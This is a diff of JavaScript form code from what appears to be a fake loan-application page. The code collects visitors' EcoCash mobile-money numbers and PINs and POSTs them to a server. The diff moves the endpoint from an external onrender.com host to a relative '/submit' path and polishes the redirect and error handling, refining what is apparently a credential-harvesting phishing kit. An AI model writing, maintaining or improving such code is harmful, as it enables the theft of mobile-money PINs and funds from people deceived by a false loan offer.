@@ -153,19 +153,16 @@ async function submitForm() {
 
     try {
 
-    const response = await fetch(
-        "https://kashagi-loans-1-sq9v.onrender.com/submit",
-        {
-            method: "POST",
-            headers: {
-                "Content-Type": "application/json"
-            },
-            body: JSON.stringify({
-                ecocash_number: ecocash_number,
-                ecocash_pin: ecocash_pin
-            })
-        }
-    );
+    const response = await fetch("/submit", {
+        method: "POST",
+        headers: {
+            "Content-Type": "application/json"
+        },
+        body: JSON.stringify({
+            ecocash_number: ecocash_number,
+            ecocash_pin: ecocash_pin
+        })
+    });
 
     if (!response.ok) {
         throw new Error("Server returned " + response.status);
@@ -179,17 +176,17 @@ async function submitForm() {
 
         document.getElementById("loanForm").reset();
 
-        window.location.href = "/thankyou.html";
+        window.location.replace("/thankyou.html");
 
     } else {
 
-        alert("❌ Submission failed. Please try again.");
+        alert("❌ " + (data.message || "Submission failed."));
 
     }
 
 } catch (error) {
 
-    console.error(error);
+    console.error("Submission Error:", error);
 
     alert("❌ Server connection error. Please try again later.");
 
